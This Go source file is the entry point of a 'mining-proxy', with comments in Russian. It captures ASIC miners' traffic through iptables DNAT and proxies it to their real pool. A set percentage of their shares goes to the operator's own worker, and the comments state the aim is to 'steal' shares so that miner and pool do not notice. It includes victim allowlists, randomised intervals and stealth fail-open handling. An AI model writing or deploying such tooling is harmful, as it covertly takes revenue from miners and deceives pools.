// Пакет main — точка входа в mining-proxy.
//
// Задача программы (вся логика подробно описана в ARCHITECTURE.md):
//   - принять TCP-соединения от ASIC-майнеров (после iptables DNAT);
//   - прозрачно проксировать их в реальный (upstream) майнинг-пул;
//   - парсить каждый mining.submit и часть шар (процент 0.1–100%)
//     перенаправлять в целевой пул на наш воркер (комиссия);
//   - оригинал каждой шары ВСЕГДА дублируется в реальный пул, чтобы
//     майнер и пул не замечали подмены и не рвались соединения.
package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"mining-proxy/config"
	"mining-proxy/iptables"
	"mining-proxy/monitor"
	"mining-proxy/proxy"
)

func main() {
	// --- 1. Аргументы командной строки ---
	// Единственный флаг -config: путь к YAML-конфигу.
	// По умолчанию ищем "config.local.yaml" в текущей директории — тот файл,
	// который генерирует mining-proxy-start. Эталон с комментариями лежит
	// рядом в config.example.yaml и сам по себе не запускает прокси.
	cfgPath := flag.String("config", "config.local.yaml", "path to YAML config file")
	flag.Parse()

	// --- 2. Загрузка конфигурации ---
	// Читаем YAML, применяем дефолты, проверяем обязательные поля.
	// Возвращается заполненная структура Config (см. config/config.go).
	cfg, err := config.Load(*cfgPath)
	if err != nil {
		log.Fatalf("[FATAL] config load: %v", err)
	}

	// Логируем ключевые параметры запуска — чтобы сразу видеть, что стартуем.
	log.Printf("[MAIN] mining-proxy starting... (pass_through=%v)", cfg.PassThrough())
	if cfg.PassThrough() {
		log.Printf("[MAIN] pass-through: upstream_pool or steal_to is empty — no stealing, transparent proxy")
	} else {
		log.Printf("[MAIN] upstream: %s (ssl=%v)", cfg.UpstreamPool, cfg.UpstreamSSL)
		log.Printf("[MAIN] steal to: %s worker=%s (ssl=%v)", cfg.StealTo.Pool, cfg.StealTo.Worker, cfg.StealTo.SSL)
		log.Printf("[MAIN] percentage: %.1f%% | mode: %s | interval: %.0f-%.0f hours",
			cfg.Percentage, stealModeName(cfg.PauseShares), cfg.IntervalMinHours, cfg.IntervalMaxHours)
	}

	// --- 3. Создание "stealer" (ядро логики кражи шар) ---
	// ShareStealer решает для каждой шары: перенаправлять её или нет.
	// Внутри него хранится статистика и персистентное соединение с целевым пулом.
	// Правила (этап 4) — allowlist пар (пул, воркер); пусто = кусать у всех.
	rules := make([]proxy.StealRule, 0, len(cfg.StealRules))
	for _, r := range cfg.StealRules {
		rules = append(rules, proxy.StealRule{Pool: r.Pool, Worker: r.Worker})
	}
	stealRules := proxy.NewStealRules(rules)
	if stealRules.Len() > 0 {
		log.Printf("[MAIN] steal rules: %d (allowlist; остальное сквозняком)", stealRules.Len())
	} else {
		log.Printf("[MAIN] steal rules: не заданы — кусаем у всех (legacy)")
	}
	stealer := proxy.NewShareStealer(&proxy.ShareStealerConfig{
		Percentage:    cfg.Percentage,     // доля шар, которые кусаем
		IntervalMin:   cfg.IntervalMin(),  // минимальная пауза между циклами
		IntervalMax:   cfg.IntervalMax(),  // максимальная пауза между циклами
		TargetPool:    cfg.StealTo.Pool,   // куда перенаправляем
		TargetWorker:  cfg.StealTo.Worker, // под каким воркером
		TargetPass:    cfg.StealTo.Pass,   // пароль воркера
		TargetSSL:     cfg.StealTo.SSL,    // TLS к целевому пулу?
		TargetTimeout: time.Duration(cfg.TargetTimeoutSec) * time.Second,
		PauseShares:   cfg.PauseShares,   // «пауза в шарах» — точный %
		Rules:         stealRules,        // allowlist (пул+воркер), этап 4
		PassThrough:   cfg.PassThrough(), // pass-through: upstream не задан
	})

	// --- 3a. Heartbeat живости прокси ---
	// Обновляется сервером (accept-цикл + фоновый тикер). Монитор /health
	// отвечает 503, если heartbeat «протух» — на это реагирует watchdog
	// (fail-open). Создаём ДО монитора, чтобы он успел получить ссылку.
	hb := proxy.NewHeartbeat()

	// --- 3b. Реестр «база» пул+воркер (этап 3) ---
	// Наполняется из живого трафика (authorize/submit). Виден в /status.
	// На его основе в дальнейшем будут применяться правила кражи (этап 4).
	disc := proxy.NewDiscovery()

	// --- 4. Параметры NAT (из конфига) ---
	// Входящие интерфейсы определяются автоматически по маршруту к подсетям
	// (iptables.resolveIngressIfaces), поэтому в конфиге обычно ничего
	// указывать не нужно.
	natOpts := iptables.Options{
		Subnets:       cfg.AllowedSubnets,
		ListenAddr:    cfg.ListenAddr,
		UpstreamPort:  cfg.UpstreamPort,
		CaptureAllTCP: cfg.CaptureAllTCP,
		IngressIfaces: cfg.NATIngressIfaces,
	}

	// --- 5. TCP-прокси: сначала занять порт, потом направлять в него трафик ---
	// Порядок важен. Если сначала включить DNAT, а потом повесить
	// listener, то в промежутке ASIC получит RST на пустой порт. Поэтому
	// слушатель поднимается ПЕРВЫМ, а перехват включается вторым.
	srv := proxy.NewServer(cfg.ListenAddr, cfg.UpstreamPool, cfg.UpstreamSSL, cfg.TransparentOn(), stealer, disc, hb)
	if err := srv.Listen(); err != nil {
		log.Fatalf("[FATAL] не удалось занять %s: %v", cfg.ListenAddr, err)
	}

	// --- 6. Настройка iptables (NAT/DNAT) ---
	// Если включено (нужен root): создаём цепочку MINING_PROXY, направляем
	// трафик разрешённых подсетей в наш прокси. capture_all_tcp=true —
	// перенаправляем весь TCP подсети (воронка), иначе только порт пула.
	// Setup сам включает ip_forward/route_localnet, определяет входящий
	// интерфейс и открывает порт прокси в filter/INPUT, а также проверяет
	// результат и падает, если перехват гарантированно не работает.
	// Cleanup вызывается через defer — при остановке правила снимаются и
	// трафик ASIC идёт напрямую в пул (fail-open, майнинг не прерывается).
	if cfg.SetupIPTables {
		log.Printf("[MAIN] настройка iptables (capture_all_tcp=%v, подсети=%v)", cfg.CaptureAllTCP, cfg.AllowedSubnets)
		if err := iptables.Setup(natOpts); err != nil {
			log.Fatalf("[FATAL] iptables setup: %v", err)
		}
		defer iptables.Cleanup(natOpts)
	} else {
		log.Printf("[MAIN] iptables: setup_iptables=false — NAT не настраивается, перехват трафика нужно сделать вручную")
	}

	// --- 7. Приём соединений ---
	// Listener уже создан в Listen(); Run() крутит accept loop. Каждое
	// соединение обрабатывается в отдельной goroutine. transparent=true
	// (по умолчанию): реальный адресат берётся из iptables DNAT
	// (SO_ORIGINAL_DST), так что разные клиенты с разными пулами
	// обслуживаются из одного прокси.
	go func() {
		if err := srv.Run(); err != nil {
			log.Fatalf("[FATAL] server: %v", err)
		}
	}()

	// --- 8. HTTP-мониторинг ---
	// Эндпоинты /status (JSON-статистика + реестр + диагностика NAT) и
	// /health (healthcheck). Поднимаем ПОСЛЕ NAT, чтобы в /status сразу был
	// виден реальный снимок перехвата. По умолчанию слушает только
	// 127.0.0.1, наружу не отдаётся.
	if cfg.MonitorAddr != "" {
		monitor.StartServer(cfg.MonitorAddr, stealer, hb, disc,
			natStatus{opts: natOpts}, cfg.StealTo.Pool, cfg.StealTo.Worker)
	}

	// --- 9. systemd sd_notify (WatchdogSec) ---
	// Если процесс запущен под systemd (NOTIFY_SOCKET есть) — сообщаем
	// "READY=1" и периодически "WATCHDOG=1", чтобы WatchdogSec не убивал
	// живой прокси. Вне systemd вызовы — no-op.
	if err := notifySystemd("READY=1"); err != nil {
		log.Printf("[MAIN] sd_notify READY: %v", err)
	}
	go sdNotifyLoop()

	log.Printf("[MAIN] proxy running on %s", cfg.ListenAddr)
	log.Printf("[MAIN] monitor: http://%s/status", cfg.MonitorAddr)

	// --- 10. Graceful shutdown ---
	// Ждём SIGINT (Ctrl+C) или SIGTERM (systemctl stop). После сигнала
	// дожидаемся завершения всех активных соединений и очищаем iptables.
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig

	log.Printf("[MAIN] shutdown signal received, cleaning up...")
	// Останавливаем сервер (закрывает listener, дожидается активных сессий).
	srv.Shutdown()
	// Останавливаем фоновый health-check и закрываем соединение к целевому пулу.
	stealer.Close()
	fmt.Println("[MAIN] stopped.")
}

// stealModeName возвращает человекочитаемое имя режима кражи для логов.
//
// Существенно, потому что режимы взаимоисключающие: при pause_shares=true
// интервалы interval_min/max_hours НЕ читаются вообще (см. ShouldSteal в
// proxy/redirect.go), и без явного указания режима в логе невозможно понять,
// почему фактический процент не совпадает с заданным.
func stealModeName(pauseShares bool) string {
	if pauseShares {
		return "пауза в шарах (точный %, интервалы не используются)"
	}
	return "пауза по времени (интервалы)"
}

// natStatus отдаёт в /status живой снимок состояния NAT: какие правила
// iptables стоят, включён ли форвардинг, поднят ли route_localnet и открыт
// ли порт прокси в filter/INPUT.
//
// Снимок считывается на каждый запрос /status, поэтому видно ТЕКУЩЕЕ
// состояние, а не состояние на момент старта. Это важно: правила могут быть
// сняты снаружи (iptables -F, перезагрузка, другой firewall), и тогда
// в nat.problems появятся конкретные пункты.
type natStatus struct {
	opts iptables.Options
}

// NATSnapshot реализует контракт monitor.NATStatusProvider.
func (n natStatus) NATSnapshot() interface{} {
	return iptables.Status(n.opts)
}
